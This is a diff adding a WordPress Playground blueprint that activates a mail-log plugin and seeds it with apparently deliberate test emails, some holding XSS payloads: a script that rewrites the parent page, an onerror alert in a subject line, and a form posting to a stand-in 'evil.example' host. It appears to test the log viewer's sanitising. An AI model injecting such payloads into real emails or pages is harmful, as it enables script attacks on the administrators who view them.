@@ -1,0 +1,15 @@
+{
+	"$schema": "https://playground.wordpress.net/blueprint-schema.json",
+	"landingPage": "/wp-admin/admin.php?page=outbox",
+	"login": true,
+	"steps": [
+		{
+			"step": "activatePlugin",
+			"pluginPath": "outbox-mail-log/outbox-mail-log.php"
+		},
+		{
+			"step": "runPHP",
+			"code": "<?php require '/wordpress/wp-load.php'; add_filter( 'pre_wp_mail', function ( $r, $a ) { return false !== strpos( $a['subject'], 'FAIL' ) ? false : true; }, 10, 2 ); $html = '<html><head><style>h1{color:#c00}</style></head><body><h1>Bestellung #125615</h1><p>Hallo <b>Jan</b>, danke! 👍</p><img src=\"https://example.com/pixel.gif\" width=\"1\" height=\"1\"><script>parent.document.body.innerHTML=\"PWNED\"</script><a href=\"https://example.com/my-account/?key=wc_order_SECRET123\">Bestellung ansehen</a><form action=\"https://evil.example\"><input name=x><button>Go</button></form></body></html>'; for ( $i = 0; $i < 60; $i++ ) { wp_mail( 'kunde' . $i . '@example.com', '[playershub.de] Bestellung (#1256' . $i . ') abgeschlossen!', $html, array( 'Content-Type: text/html; charset=UTF-8' ) ); } wp_mail( array( 'anna@example.com', 'Bob <bob@example.org>' ), 'Passwort zurücksetzen', \"Klicke hier: https://site.test/wp-login.php?action=rp&key=AbCdEf123&login=anna\\n\\nGruß\" ); wp_mail( 'fail@example.com', 'Das hier FAIL', 'Text' ); wp_mail( 'x@example.com', '<img src=x onerror=alert(1)>XSS-Betreff', '<b>plain?</b>' ); echo 'ok';"
+		}
+	]
+}
